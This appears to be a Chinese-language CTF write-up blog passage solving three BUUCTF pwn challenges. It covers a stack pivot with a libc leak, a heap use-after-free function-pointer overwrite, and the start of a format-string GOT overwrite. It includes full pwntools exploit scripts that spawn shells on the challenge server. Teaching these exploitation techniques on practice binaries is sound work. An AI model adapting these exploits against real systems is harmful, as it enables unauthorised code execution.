class="attr">spwn:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> </span><br><span class="line"><span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=0ffa519ef269240388d07b316b1ef863216e24cb,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">spwn</span></span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span>         <span class="string">//开启了</span> <span class="string">NX保护</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>32位 elf 程序，开启了 NX保护，于是首先暂时就不必去想 用shellcode了。<br>我们看下ida：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vul_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]              //buf的偏移： ebp-0x18</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, m1, v0);                             <span class="comment">// Hello good Ctfer!</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);                          <span class="comment">// bss 段 输入 最长 0x200字节的数据</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, m2, v1);                             <span class="comment">// What do you want to say?</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);                  <span class="comment">// 存在栈溢出漏洞，但最多只可 覆盖到ret_addr</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序 还是很容易看得懂的，看最后的 read(0, &amp;buf, 0x20u)函数，这里虽然存在栈溢出，但仅可溢出到 ret_Addr,但这程序中是没有 后门函数的，所以我们 首先要做的 其实是 泄露出libc，并且要控制 要 返回到 main地址，因为我们目前才可以得到libc，我们还要接下来的拿shell 操作。</p><p>而栈溢出 的长度 不够我们在最后read函数这里去构造泄露libc的rop链， 而栈迁移 是刚好用来解决这个 问题的，我们再开始之前 先来了解下 栈迁移的基本知识，</p><p>我们来 看下汇编中 这几个指令的本质：<br>call:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">eip</span>+<span class="number">4</span><span class="comment">;        //将call 所在地址的下一行的(栈)地址 push进栈</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span><span class="comment">;          //将ebp栈地址 push 进栈</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span><span class="comment">;       //将 esp栈地址 赋值给 ebp栈地址</span></span><br></pre></td></tr></table></figure><p>leave:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span> <span class="comment">;      //将 ebp栈地址 赋值给 esp栈地址</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span><span class="comment">;           //将esp栈地址中的数据 pop给 ebp栈地址中</span></span><br><span class="line"></span><br><span class="line">再执行完 <span class="keyword">leave</span> 后   </span><br><span class="line"><span class="built_in">esp</span>的栈地址变成了<span class="built_in">ebp</span>再+<span class="number">4</span>的栈地址，<span class="built_in">ebp</span>的栈地址变成了<span class="built_in">ebp</span>栈地址中的数据</span><br></pre></td></tr></table></figure><p>ret：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> eip;           <span class="comment">//将esp栈地址中的数据 pop 给 eip</span></span><br></pre></td></tr></table></figure><p>我们首先构造好 泄露libc且会再次返回到main地址的 rop攻击链：放在 bss 段上   //s的位置</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop=p32(<span class="name">write_plt</span>)+p32(<span class="name">main</span>)+p32(<span class="number">1</span>)+p32(<span class="name">write_got</span>)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>“pop eip 相当于将栈顶数据给了eip，由于ret返回的是esp栈地址中的数据， 而leave将ebp栈地址的值赋给了esp栈地址，所以可以通过覆盖ebp栈地址中的数据来控制ret的返回地址，而两次leave就可以控制esp为我们想要的地址了，不过第二次的pop ebp是多余的，会使esp-4，所以将ebp覆盖到我们构造的函数地址-4即可”</p><p>我们这样 覆盖：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pd2='a'*0x18</span><br><span class="line">pd2+=p32(bss_addr-4)        <span class="comment">#ebp</span></span><br><span class="line">pd2+=p32(leave_ret)          <span class="comment">#ret_addr</span></span><br></pre></td></tr></table></figure><p>我觉得 这个实在光看文字会 太绕，我gdb 动态给展示下：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Zq9H.png" alt="J9Zq9H.png"><br><br>此时的ebp，esp</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  <span class="number">0xffa4ea98</span> —▸ <span class="number">0x804a2fc</span> (fake2+<span class="number">508</span>) ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffa4ea80</span> ◂— <span class="number">0x61616161</span> ('aaaa')</span><br></pre></td></tr></table></figure><p>根据上面 的leave 指令的实质，执行过 leave 后，esp的栈地址变成了ebp再+4的栈地址，ebp的栈地址变成了ebp栈地址中的数据<br>即 执行完leave指令后 期望 应该是</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP： <span class="number">0x804a2fc</span> (fake2+<span class="number">508</span>) ◂— <span class="number">0x0</span></span><br><span class="line">ESP：<span class="number">0xffa4ea98</span>+<span class="number">4</span> 即<span class="number">0xffa4ea9c</span></span><br></pre></td></tr></table></figure><p>我们 ni 走下：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZOgA.png" alt="J9ZOgA.png"><br><br>和我们预想的一样，而接着 我们在ret_addr 再填一个 leave，执行ret后 会再执行一次 leave，会使得 ebp和esp再经历一次上面一样的变化，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZXjI.png" alt="J9ZXjI.png"><br><br>执行 return 后可以看到 确实又执行到 leave<br>此时:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">EBP</span>  <span class="number">0x804a2fc</span> (fake2+<span class="number">508</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="built_in">ESP</span>  <span class="number">0xffa4eaa0</span> —▸ <span class="number">0xf7fd29b0</span> (_dl_fini) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br></pre></td></tr></table></figure><p>同样 我们猜测  下再次执行完后 leave 后esp 和ebp的状态：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  <span class="number">0x0</span></span><br><span class="line">ESP  <span class="number">0x804a2fc</span>+<span class="number">4</span> 即 <span class="number">0x0804A300</span>(s的位置)</span><br></pre></td></tr></table></figure><p>符合我们的期望！<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZxDP.png" alt="J9ZxDP.png"><br><br>接着 就 执行到 我们的 构造的ROP攻击链了。<br>根据以上，我们写出下面exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p=remote('node3.buuoj.cn',26843)</span><br><span class="line"><span class="comment">#p=process('./spwn')</span></span><br><span class="line">elf=ELF('./spwn')</span><br><span class="line">write_plt=elf.plt['write']</span><br><span class="line">write_got=elf.got['write']</span><br><span class="line">main_addr=elf.symbols['main']</span><br><span class="line">bss_addr=0x0804A300                     <span class="comment">#s</span></span><br><span class="line">leave_ret=0x08048511</span><br><span class="line"></span><br><span class="line">pd=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)    <span class="comment">#返回到main 使程序重新执行一次，为下步拿shell做准备</span></span><br><span class="line">p.recvuntil(<span class="string">"What is your name?"</span>)</span><br><span class="line">p.send(pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pd2='a'*0x18</span><br><span class="line">pd2+=p32(bss_addr-4)        <span class="comment">#ebp</span></span><br><span class="line">pd2+=p32(leave_ret)          <span class="comment">#ret_addr</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What do you want to say?"</span>)</span><br><span class="line">p.send(pd2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">print <span class="string">"write_addr "</span>+hex(write_addr)</span><br><span class="line">libc=LibcSearcher('write',write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump('write')</span><br><span class="line">system_addr=libc_base+libc.dump('system')</span><br><span class="line">str_bin_sh=libc_base+libc.dump('str_bin_sh')</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What is your name?"</span>)</span><br><span class="line">pd=p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What do you want to say?"</span>)</span><br><span class="line">p.send(pd2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>稍微 总结下 ，栈迁移的题，这题的话是一种类型（程序中是有leave；ret；），我们可以在 ret_addr处 填入 leave，ebp处 填入 我们的rop链所在地址，再减4 的地址。即可达到切栈的效果。 </p><h2 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h2><p>这一题 其实也属于  堆上的基础题了。UAF漏洞。<br>最开始分析程序之前 我们检查下 程序开启的相关保护：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">ydsneedgirlfriend2</span></span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line">    </span><br><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">ydsneedgirlfriend2</span> </span><br><span class="line"><span class="attr">ydsneedgirlfriend2:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> </span><br><span class="line"><span class="string">interpreter</span> <span class="string">/lib64/l,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">3.2</span><span class="number">.0</span><span class="string">,</span> <span class="string">BuildID[sha1]=9adecad0c22b07033922aa4a67a6040622c8be81,</span> <span class="string">not</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure><p>64位 elf 程序，开启NX保护。<br>拖入ida：<br>main函数：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  _BYTE v4[<span class="number">6</span>]; <span class="comment">// [rsp-16h] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myinit();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();                                   <span class="comment">//   puts(&amp;byte_400E6F);</span></span><br><span class="line">                                                <span class="comment">//   puts("1.add a girlfriend");</span></span><br><span class="line">                                                <span class="comment">//   puts("2.dele a girlfriend");</span></span><br><span class="line">                                                <span class="comment">//   puts("3.show a girlfriend");</span></span><br><span class="line">                                                <span class="comment">//   puts("4.exit");</span></span><br><span class="line">                                                <span class="comment">//   return puts("u choice :");</span></span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, v4, <span class="number">6u</span>LL);</span><br><span class="line">      choice = atoi(v4);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      dele();                                   <span class="comment">// UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有3个 程序功能就是: </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="built_in">add</span> <span class="keyword">a</span> girlfriend<span class="comment">");</span></span><br><span class="line"><span class="number">2</span>.dele <span class="keyword">a</span> girlfriend<span class="comment">");</span></span><br><span class="line"><span class="number">3</span>.show <span class="keyword">a</span> girlfriend<span class="comment">");</span></span><br></pre></td></tr></table></figure><p>我们看下 add函数功能：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Zvut.png" alt="J9Zvut.png"><br><br>我们可以看到 这里有两个 malloc，<br>第一个malloc(0x10)是 申请的 struct girlfriend结构体，</p><p>第一个malloc(v2),这里的v2 是我们可控制的size，是申请的 name 的chunk</p><p>我们可在add 函数里 推出 这个程序 使用了 下面的结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">girlfriends</span>&#123;</span>                 <span class="comment">//girlfriends[0] = malloc(0x10uLL)</span></span><br><span class="line"> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> name_chunk_addr;      <span class="comment">//v0 = (void **)girlfriends[0];*v0 = malloc(v2);</span></span><br><span class="line"> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> print_girlfriend_name; <span class="comment">//girlfriends[0][1] = print_girlfriend_name;</span></span><br><span class="line">&#125;girlfriends;</span><br></pre></td></tr></table></figure><p>看下show 功能：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZzHf.png" alt="J9ZzHf.png"><br><br>如果 结构体存在，则 执行struct girlfriends-&gt; print_girlfriend_name函数，我们看些这个函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">print_girlfriend_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是 个puts 出 struct girlfriends-&gt; name中的数据。<br>我们再看下 delete函数：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9epE8.png" alt="J9epE8.png"><br><br>这个程序的洞 其实就是在这了，因为 free 掉chunk后 却没有进行 置零 操作。delete后，我们仍可以可以控制 chunk。<br>而这题 又因为存在后门函数，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9e9US.png" alt="J9e9US.png"><br><br>所以我们可以这样 首先 申请 结构体， girlfriends 0，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9eC4g.png" alt="J9eC4g.png"><br><br>然后 我们 delete  girlfriends 0，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9eF3j.png" alt="J9eF3j.png"><br><br>可以发现 bins 链上 有两个  free chunk，且由于 UAF漏洞 delete后 结构体 0的指针仍然存在。</p><p>然后 再申请一个 0x10 的的结构体 girlfriends 0<br>因为 结构体 0的指针仍然存在，所以 再add 函数中 就不会 再去首先申请 一个 0x10的结构题去做 新的girlfriends 0 了，而是 直接让我们 输入 size（这里就是0x10了），去申请 name 所在的堆块，我们观察bins 上的chunk，我们首先申请出来的会是 0x246960的堆块，且这个又是  girlfriends 0 结构体，我们只要把这个结构体 的print_girlfriend_name 指针给覆写 成后门函数就可以了，这样当我们执行 show 函数时，就会  调用print_girlfriend_name 时 就实际会 调用 backdoor，从而拿到shell。<br><br><img src="https://s1.ax1x.com/2020/04/15/J9eiCQ.png" alt="J9eiCQ.png"><br><br>我们可以看到 如我们上面的所述，呈现的结果与我们的期望一执，可以看到 bins上的0x2469350 被申请当作  girlfriends 0中的name 堆块了，同时又是 girlfriends 0结构体本身。<br>我们再接着 show(0)其实就可 pwn 掉程序了。<br>完整exp  如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">elf = ELF(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="comment">#18</span></span><br><span class="line">p = process(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",27625)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"u choice :\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input the length of her name:\n"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me her name:\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#def edit(index,content):</span></span><br><span class="line"><span class="comment">#p.sendlineafter("choice: ",'2')</span></span><br><span class="line"><span class="comment">#p.sendlineafter("idx?",str(index))</span></span><br><span class="line"><span class="comment">#p.sendlineafter("content:",content)</span></span><br><span class="line"><span class="comment">#p.recvuntil("Done!\n")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"u choice :\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"u choice :\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(backdoor)</span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h2><p>这题  是个64位的elf 程序，动态链接 开启了NX和canary保护。<br>而考察 其实 是 利用了格式化字符任意写,另外 我们要知道的是  当函数返回的时候 会比较canary的 值 是否发生变化，如果不一致，就触发 __stack_chk_fail 函数。<br>拖入ida:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]                       </span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);             <span class="comment">//存在栈溢出 漏洞，但有canary 保护，虽然可通过任意地址写 可泄露canary，但程序只运行 一边。不可取</span></span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);                  <span class="comment">//格式化字符串 漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">backdoor</span><span class="params">()</span>        <span class="comment">//0x400626</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面代码中的注释可知，栈溢出的方法 不可取， 因为程序开启了Canary 当函数返回的时候 会比较canary的 值 是否发生变化，如果不一致，就触发 __stack_chk_fail 函数。且程序中 含有后门函数。 我们可通过格式化字符串写 将backdoor_addr写入 __stack_chk_fail_got 中 脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span 